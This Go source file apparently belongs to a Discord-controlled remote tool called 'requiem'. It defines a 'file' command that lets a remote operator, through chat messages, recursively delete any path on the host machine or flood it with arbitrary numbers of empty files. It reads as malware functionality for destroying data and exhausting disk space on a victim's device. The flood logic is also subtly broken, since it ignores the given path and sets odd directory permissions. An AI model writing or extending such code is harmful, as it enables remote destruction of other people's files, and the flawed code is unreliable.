package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"requiem/utils"

	"github.com/bwmarrin/discordgo"
)

func (*FileCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
	if len(args) < 2 {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 You need to provide a flag and a path.", msg.Reference())
		return
	}

	content := strings.Join(args, " ")

	path := utils.UnwrapQuotes(content)
	if path == "" {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 You need to wrap the path in double quotes.", msg.Reference())
		return
	}

	if utils.HasFlag(content, "delete") {
		err := os.RemoveAll(path)
		if err != nil {
			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to delete - %s", err), msg.Reference())
			return
		}

		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟩 Successfully deleted %q", path), msg.Reference())
		return
	}

	if utils.HasFlag(content, "flood") {
		count, found := utils.FindNumber(content)
		if found == false {
			ses.ChannelMessageSendReply(msg.ChannelID, "🟥 You need to provide a number.", msg.Reference())
			return
		}

		os.MkdirAll(filepath.Dir(path), 0666)

		for i := range count {
			name := fmt.Sprintf("%d%d", time.Now().UnixNano(), i)

			file, _ := os.Create(name)
			file.Close()
		}

		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟩 Successfully flooded %q", path), msg.Reference())
		return
	}

	ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Invalid flag.", msg.Reference())
}

func (*FileCommand) Name() string {
	return "file"
}

func (*FileCommand) Info() string {
	return "Do things with the files on the deivce."
}

type FileCommand struct{}
